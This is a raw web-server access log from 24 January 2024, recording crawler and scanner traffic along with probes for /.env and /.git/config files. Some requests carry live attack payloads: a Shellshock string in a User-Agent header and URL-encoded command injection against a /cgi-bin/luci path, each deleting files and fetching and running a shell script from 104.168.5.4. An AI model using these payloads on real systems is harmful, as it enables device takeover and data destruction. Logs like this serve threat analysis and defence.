190.57.197.241 - - [24/Jan/2024:06:32:18 +0000] "GET / HTTP/1.1" 200 37591 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
146.19.24.23 - - [24/Jan/2024:06:33:59 +0000] "GET / HTTP/1.1" 200 37591 "-" "-"
45.55.0.42 - - [24/Jan/2024:06:46:20 +0000] "MGLNDD_193.122.114.10_80" 400 182 "-" "-"
165.154.11.51 - - [24/Jan/2024:06:52:23 +0000] "GET / HTTP/1.1" 200 37591 "-" "curl/7.29.0"
165.154.11.51 - - [24/Jan/2024:06:52:24 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03W\x88\x5C\xF2\x07\xB7\xA15+L\xB9/\xE5Op\xA1\xA2M\x14\xAES\xF0\xE5\x90g\x9Ap\xD4\xD0\xB7c\xDD \xD3\xB5\xDC\x13on\xA6Xb$\x99\x94s\x9E+\xF7\x09b:*\xA2\x8C\xB1\xAD@\xB1\x86\xA2\xE9\xB9C-\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 182 "-" "-"
165.154.11.51 - - [24/Jan/2024:06:52:25 +0000] "t3 12.1.2" 400 182 "-" "-"
172.70.174.204 - - [24/Jan/2024:07:15:32 +0000] "GET /robots.txt HTTP/1.1" 200 13 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
172.70.39.107 - - [24/Jan/2024:07:15:33 +0000] "GET /posts/f330a48685b92d65924bbda64018b737/ HTTP/1.1" 200 49938 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.224 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
45.79.163.53 - - [24/Jan/2024:07:28:32 +0000] "GET / HTTP/1.1" 400 280 "-" "Mozilla/5.0 zgrab/0.x"
172.104.11.4 - - [24/Jan/2024:07:28:36 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
69.164.217.245 - - [24/Jan/2024:07:31:00 +0000] "GET / HTTP/1.1" 400 280 "-" "Mozilla/5.0 zgrab/0.x"
45.33.80.243 - - [24/Jan/2024:07:31:31 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
172.69.223.198 - - [24/Jan/2024:07:37:32 +0000] "GET /robots.txt HTTP/1.1" 200 13 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
172.69.214.115 - - [24/Jan/2024:07:37:36 +0000] "GET /posts/62819c508aed7d393336358e7b6907b4/ HTTP/1.1" 200 22684 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
45.79.163.53 - - [24/Jan/2024:07:46:28 +0000] "GET / HTTP/1.1" 400 280 "-" "Mozilla/5.0 zgrab/0.x"
172.105.128.11 - - [24/Jan/2024:07:48:35 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
198.199.101.67 - - [24/Jan/2024:07:50:42 +0000] "GET / HTTP/1.1" 400 280 "-" "Mozilla/5.0 zgrab/0.x"
198.74.56.46 - - [24/Jan/2024:08:08:05 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 zgrab/0.x"
172.104.11.4 - - [24/Jan/2024:08:08:18 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
172.71.122.137 - - [24/Jan/2024:08:35:02 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
198.235.24.110 - - [24/Jan/2024:08:50:10 +0000] "GET / HTTP/1.0" 200 37591 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
78.153.140.177 - - [24/Jan/2024:08:50:22 +0000] "GET /.env HTTP/1.1" 400 682 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [24/Jan/2024:08:50:22 +0000] "GET /.env HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.36.115.221 - - [24/Jan/2024:09:15:15 +0000] "GET /.env HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.36.115.221 - - [24/Jan/2024:09:15:16 +0000] "POST / HTTP/1.1" 405 584 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
71.6.134.234 - - [24/Jan/2024:09:16:56 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
172.104.210.105 - - [24/Jan/2024:09:18:10 +0000] "GET / HTTP/1.1" 400 280 "-" "Mozilla/5.0 zgrab/0.x"
45.79.128.205 - - [24/Jan/2024:09:19:28 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.224.128.191 - - [24/Jan/2024:09:30:26 +0000] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03D&[g\xCC\x12<\xD6e\xEE#\xA6\xF7{\xD9;\x15\xB38\x1F\x85\xEF| /\xDD\x98\xD5\xE7[\xEE\xC1 \xA2N\x8B\x9D\x22\x96\xC3\xFE,\x08\x8E\xF17\xA9B\x91a\xC5\x11'\x19\x93\x0E\xE8\xFE\xDF\xCD\xD9\x8E!\xC5$\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 182 "-" "-"
71.6.134.234 - - [24/Jan/2024:09:32:51 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xB2\x84\xA6J\xD74\xB7\xF1\x1C\xDA\xF1I\x1D\xB1\xF5\xF3*\xE1\xAE0)\xB9\x9Fo6\x80\xE1\x148@\xF4\xAD \xD0g\x95\x7F\xD6\xCBy)\xE6\xE0\x92R/\x80\x1C\xF1\xB67p" 400 182 "-" "-"
146.19.24.23 - - [24/Jan/2024:09:39:18 +0000] "GET / HTTP/1.1" 200 37591 "-" "-"
139.59.101.104 - - [24/Jan/2024:09:43:34 +0000] "GET /cdn-cgi/trace HTTP/1.1" 404 152 "-" "Mozilla/5.0"
51.158.154.217 - - [24/Jan/2024:09:51:07 +0000] "GET / HTTP/1.1" 200 37591 "-" "-"
172.71.126.197 - - [24/Jan/2024:10:06:39 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
185.100.87.136 - - [24/Jan/2024:10:18:33 +0000] "\x10 \x00\x00BBBB\xBA\x8C\xC1\xABDAAA" 400 182 "-" "-"
185.100.87.136 - - [24/Jan/2024:10:18:34 +0000] "POST /index.htm HTTP/1.1" 400 682 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
185.100.87.136 - - [24/Jan/2024:10:18:45 +0000] "aaaabbbbccccdddd\x00\x00\x00\x00\x00\x00\x00\x00,k\x00\x00\x04\x00\x00\x00\x92\x10" 400 182 "-" "-"
141.101.69.23 - - [24/Jan/2024:10:31:14 +0000] "GET /favicon.ico HTTP/1.1" 200 9662 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
198.74.56.46 - - [24/Jan/2024:10:40:24 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 zgrab/0.x"
45.79.128.205 - - [24/Jan/2024:10:44:03 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.33.87.154 - - [24/Jan/2024:11:18:34 +0000] "GET / HTTP/1.1" 400 280 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.104 - - [24/Jan/2024:11:18:47 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
27.147.136.161 - - [24/Jan/2024:11:26:31 +0000] "GET //libs/js/iframe.js HTTP/1.1" 404 152 "-" "python-requests/2.27.1"
45.95.169.184 - - [24/Jan/2024:11:36:08 +0000] "\xC9\x94\xD1\xA6\xAE\x9C\x05lM/\x09\x8Cp#\xEE\x9D*5#]\xC7R:\xC8\x8E/\x11\xB8\xCD\x89Z\xFB\xA4\x19f\xD2\xCE\xB3\xA1\x81\xBB\xFC\xA0\xDD%d1\x17\xA6%n\xC5" 400 182 "-" "-"
45.95.169.184 - - [24/Jan/2024:11:36:09 +0000] "\x10 \x00\x00BBBB\xBA\x8C\xC1\xABDAAA" 400 182 "-" "-"
54.36.115.221 - - [24/Jan/2024:11:36:47 +0000] "GET /.env HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.36.115.221 - - [24/Jan/2024:11:36:47 +0000] "POST / HTTP/1.1" 405 584 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
8.211.162.45 - - [24/Jan/2024:11:46:43 +0000] "GET /resolve HTTP/1.1" 404 152 "-" "Go-http-client/1.1"
8.211.162.45 - - [24/Jan/2024:11:46:43 +0000] "GET /query HTTP/1.1" 404 152 "-" "Go-http-client/1.1"
8.211.162.45 - - [24/Jan/2024:11:46:43 +0000] "GET /dns-query HTTP/1.1" 404 152 "-" "Go-http-client/1.1"
8.211.162.45 - - [24/Jan/2024:11:46:43 +0000] "GET / HTTP/1.1" 200 8108 "-" "Go-http-client/1.1"
8.211.162.45 - - [24/Jan/2024:11:46:50 +0000] "POST /resolve HTTP/1.1" 404 152 "-" "Go-http-client/1.1"
8.211.162.45 - - [24/Jan/2024:11:46:50 +0000] "POST /query HTTP/1.1" 404 152 "-" "Go-http-client/1.1"
8.211.162.45 - - [24/Jan/2024:11:46:50 +0000] "POST /dns-query HTTP/1.1" 404 152 "-" "Go-http-client/1.1"
8.211.162.45 - - [24/Jan/2024:11:46:50 +0000] "POST / HTTP/1.1" 405 182 "-" "Go-http-client/1.1"
8.211.162.45 - - [24/Jan/2024:11:46:56 +0000] "GET /query HTTP/1.1" 404 152 "-" "Go-http-client/1.1"
8.211.162.45 - - [24/Jan/2024:11:46:56 +0000] "GET / HTTP/1.1" 200 8108 "-" "Go-http-client/1.1"
8.211.162.45 - - [24/Jan/2024:11:46:56 +0000] "GET /dns-query HTTP/1.1" 404 152 "-" "Go-http-client/1.1"
8.211.162.45 - - [24/Jan/2024:11:46:56 +0000] "GET /resolve HTTP/1.1" 404 152 "-" "Go-http-client/1.1"
8.211.162.45 - - [24/Jan/2024:11:47:03 +0000] "POST /query HTTP/1.1" 404 152 "-" "Go-http-client/1.1"
8.211.162.45 - - [24/Jan/2024:11:47:04 +0000] "POST /dns-query HTTP/1.1" 404 152 "-" "Go-http-client/1.1"
8.211.162.45 - - [24/Jan/2024:11:47:04 +0000] "POST / HTTP/1.1" 405 182 "-" "Go-http-client/1.1"
8.211.162.45 - - [24/Jan/2024:11:47:06 +0000] "POST /resolve HTTP/1.1" 404 152 "-" "Go-http-client/1.1"
184.105.247.196 - - [24/Jan/2024:11:53:40 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15"
45.33.87.154 - - [24/Jan/2024:11:54:43 +0000] "GET / HTTP/1.1" 400 280 "-" "Mozilla/5.0 zgrab/0.x"
172.105.128.11 - - [24/Jan/2024:11:55:07 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
184.105.247.196 - - [24/Jan/2024:11:57:11 +0000] "GET /webui/ HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
184.105.247.196 - - [24/Jan/2024:12:00:42 +0000] "GET /favicon.ico HTTP/1.1" 200 9662 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0"
184.105.247.196 - - [24/Jan/2024:12:06:15 +0000] "GET /geoserver/web/ HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
184.105.247.196 - - [24/Jan/2024:12:07:22 +0000] "GET /.git/config HTTP/1.1" 404 152 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0"
94.102.61.88 - - [24/Jan/2024:12:15:40 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
172.70.90.26 - - [24/Jan/2024:12:38:26 +0000] "GET /favicon.ico HTTP/1.1" 200 9662 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/546.39 (KHTML, like Gecko) Chrome/57.0.1066 Safari/537.36"
172.70.162.47 - - [24/Jan/2024:12:38:29 +0000] "GET /robots.txt HTTP/1.1" 200 13 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 8_1_1) AppleWebKit/601.53 (KHTML, like Gecko) Chrome/98.0.257 Safari/537.36"
172.71.242.51 - - [24/Jan/2024:12:38:32 +0000] "GET /sitemap.xml HTTP/1.1" 200 4270 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/539.55 (KHTML, like Gecko) Chrome/104.0.480 Safari/537.36"
172.69.195.235 - - [24/Jan/2024:12:38:59 +0000] "GET /favicon.ico HTTP/1.1" 200 9662 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 8_0_2) AppleWebKit/573.55 (KHTML, like Gecko) Chrome/105.0.2484 Safari/537.36"
172.70.91.207 - - [24/Jan/2024:12:39:02 +0000] "GET /sitemap.xml HTTP/1.1" 200 4270 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/587.50 (KHTML, like Gecko) Chrome/52.0.1017 Safari/537.36"
172.69.195.70 - - [24/Jan/2024:12:39:03 +0000] "GET /robots.txt HTTP/1.1" 200 13 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/576.38 (KHTML, like Gecko) Chrome/102.0.2155 Safari/537.36"
141.101.99.8 - - [24/Jan/2024:12:39:05 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 9_0) AppleWebKit/598.37 (KHTML, like Gecko) Chrome/71.0.1107 Safari/537.36"
172.70.85.39 - - [24/Jan/2024:12:39:15 +0000] "GET /favicon.ico HTTP/1.1" 200 9662 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/554.41 (KHTML, like Gecko) Chrome/80.0.2254 Safari/537.36"
172.70.85.91 - - [24/Jan/2024:12:39:20 +0000] "GET /js/meme.min.305b3bc5fd0cf013c19bcf759329887f2806f56ff26901dd47e274623c68a0d4.js HTTP/1.1" 200 7532 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/592.49 (KHTML, like Gecko) Chrome/62.0.328 Safari/537.36"
172.70.85.219 - - [24/Jan/2024:12:39:22 +0000] "GET /sitemap.xml HTTP/1.1" 200 4270 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/559.40 (KHTML, like Gecko) Chrome/96.0.1672 Safari/537.36"
69.164.217.245 - - [24/Jan/2024:12:40:20 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 zgrab/0.x"
192.155.90.220 - - [24/Jan/2024:12:40:43 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.224.128.191 - - [24/Jan/2024:13:07:43 +0000] "GET /cgi-bin/jarrewrite.sh HTTP/1.1" 404 178 "-" "() { :; }; echo ; /bin/bash -c 'rm -rf *; cd /tmp; wget http://104.168.5.4/nigga.sh; chmod 777 nigga.sh; ./nigga.sh'"
45.33.87.154 - - [24/Jan/2024:13:08:09 +0000] "GET / HTTP/1.1" 400 280 "-" "Mozilla/5.0 zgrab/0.x"
172.104.11.51 - - [24/Jan/2024:13:08:20 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
54.37.79.75 - - [24/Jan/2024:13:11:20 +0000] "GET /.env HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [24/Jan/2024:13:11:21 +0000] "POST / HTTP/1.1" 405 584 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.224.128.55 - - [24/Jan/2024:13:14:36 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
162.158.129.84 - - [24/Jan/2024:13:18:24 +0000] "GET /robots.txt HTTP/1.1" 301 194 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
162.158.222.155 - - [24/Jan/2024:13:18:25 +0000] "GET /robots.txt HTTP/1.1" 200 13 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
172.69.151.187 - - [24/Jan/2024:13:18:25 +0000] "GET /robots.txt HTTP/1.1" 200 13 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
162.158.238.244 - - [24/Jan/2024:13:18:26 +0000] "GET / HTTP/1.1" 301 194 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
162.158.129.77 - - [24/Jan/2024:13:18:26 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
78.153.140.224 - - [24/Jan/2024:13:19:35 +0000] "\x16\x03\x01\x00\xDE\x01\x00\x00\xDA\x03\x03\x9C!;\xE0\x9D\x96\xFF.\x8E\xEA\x1A\xB7$\xD3\x9Co-\xC7\xB0\xDBJn\xD9\xC5+\x01YQnZX\xC0\x00\x00n\xC00\xC0,\xC02\xC0.\xC0/\xC0+\xC01\xC0-\x00\xA5\x00\xA3\x00\xA1\x00\x9F\x00\xA4\x00\xA2\x00\xA0\x00\x9E\xC0(\xC0$\xC0\x14\xC0" 400 182 "-" "-"
78.153.140.224 - - [24/Jan/2024:13:19:35 +0000] "GET /.env HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
162.158.238.244 - - [24/Jan/2024:13:20:33 +0000] "GET / HTTP/1.1" 301 194 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
162.158.129.77 - - [24/Jan/2024:13:20:34 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
213.32.122.82 - - [24/Jan/2024:13:30:01 +0000] "GET / HTTP/1.1" 200 37591 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
146.19.24.23 - - [24/Jan/2024:13:38:58 +0000] "GET / HTTP/1.1" 200 37591 "-" "-"
69.164.217.74 - - [24/Jan/2024:14:00:28 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 zgrab/0.x"
172.104.11.4 - - [24/Jan/2024:14:00:40 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.224.128.191 - - [24/Jan/2024:14:15:15 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd%20%2Ftmp%3B%20rm%20-rf%20%2A%3B%20wget%20http%3A%2F%2F104.168.5.4%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B.%2Ftenda.sh) HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
185.224.128.191 - - [24/Jan/2024:14:15:15 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd%20%2Ftmp%3B%20rm%20-rf%20%2A%3B%20wget%20http%3A%2F%2F104.168.5.4%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B.%2Ftenda.sh) HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
104.248.14.105 - - [24/Jan/2024:14:31:30 +0000] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03\x86\xEA\xAC\x83\xD1\xC6\x02\xD1\xC9\xCBH\xAC\xA9\x22\x8F\x14\x91s\x0FU\xBAu+\x02\xAF" 400 182 "-" "-"
104.248.14.105 - - [24/Jan/2024:14:31:32 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Linux; Android 7.0; PIC-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
45.33.87.154 - - [24/Jan/2024:14:34:48 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 zgrab/0.x"
172.104.11.4 - - [24/Jan/2024:14:35:03 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
146.19.24.23 - - [24/Jan/2024:14:42:29 +0000] "GET / HTTP/1.1" 200 37591 "-" "-"
80.66.76.149 - - [24/Jan/2024:15:01:18 +0000] "\x03\x00\x00\x13\x0E\xE0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00\x03\x00\x01\xD6" 400 182 "-" "-"
185.100.87.136 - - [24/Jan/2024:15:01:31 +0000] "POST /FD873AC4-CF86-4FED-84EC-4BD59C6F17A7 HTTP/1.1" 404 580 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
103.96.96.35 - - [24/Jan/2024:15:14:29 +0000] "GET / HTTP/1.1" 200 37591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
172.104.210.105 - - [24/Jan/2024:15:32:27 +0000] "GET / HTTP/1.1" 400 280 "-" "Mozilla/5.0 zgrab/0.x"
45.79.172.21 - - [24/Jan/2024:15:33:15 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
192.155.88.231 - - [24/Jan/2024:15:47:46 +0000] "GET / HTTP/1.1" 400 280 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.251 - - [24/Jan/2024:15:48:59 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
172.69.223.25 - - [24/Jan/2024:15:52:49 +0000] "GET /robots.txt HTTP/1.1" 301 194 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
162.158.239.9 - - [24/Jan/2024:15:52:50 +0000] "GET /robots.txt HTTP/1.1" 200 13 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
162.158.129.77 - - [24/Jan/2024:15:52:51 +0000] "GET / HTTP/1.1" 301 194 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
172.71.114.208 - - [24/Jan/2024:15:52:53 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
162.158.129.76 - - [24/Jan/2024:15:53:37 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
3.83.38.195 - - [24/Jan/2024:16:01:10 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/54.0.3061.83 Safari/537.32"
172.70.251.230 - - [24/Jan/2024:16:02:23 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
3.83.38.195 - - [24/Jan/2024:16:02:26 +0000] "\x15\x03\x01\x00\x02\x02P" 400 182 "-" "-"
3.83.38.195 - - [24/Jan/2024:16:02:34 +0000] "\x15\x03\x01\x00\x02\x02P" 400 182 "-" "-"
27.38.192.97 - - [24/Jan/2024:16:03:22 +0000] "GET /cdn-cgi/trace HTTP/1.1" 404 178 "-" "curl/7.81.0"
198.74.56.46 - - [24/Jan/2024:16:05:52 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.104 - - [24/Jan/2024:16:06:02 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
69.164.217.74 - - [24/Jan/2024:16:11:21 +0000] "GET / HTTP/1.1" 400 280 "-" "Mozilla/5.0 zgrab/0.x"
172.104.11.4 - - [24/Jan/2024:16:11:43 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.79.168.172 - - [24/Jan/2024:16:19:26 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 zgrab/0.x"
172.70.126.90 - - [24/Jan/2024:16:19:39 +0000] "GET / HTTP/1.1" 200 8108 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
172.104.11.4 - - [24/Jan/2024:16:20:09 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
20.102.245.172 - - [24/Jan/2024:16:23:26 +0000] "GET / HTTP/1.1" 200 8108 "-" "Go-http-client/1.1"
20.102.245.172 - - [24/Jan/2024:16:23:26 +0000] "GET /wp-includes/css/buttons.css HTTP/1.1" 404 152 "-" "Go-http-client/1.1"
20.102.245.172 - - [24/Jan/2024:16:23:26 +0000] "GET /media/system/js/core.js HTTP/1.1" 404 152 "-" "Go-http-client/1.1"
185.224.128.191 - - [24/Jan/2024:16:27:09 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
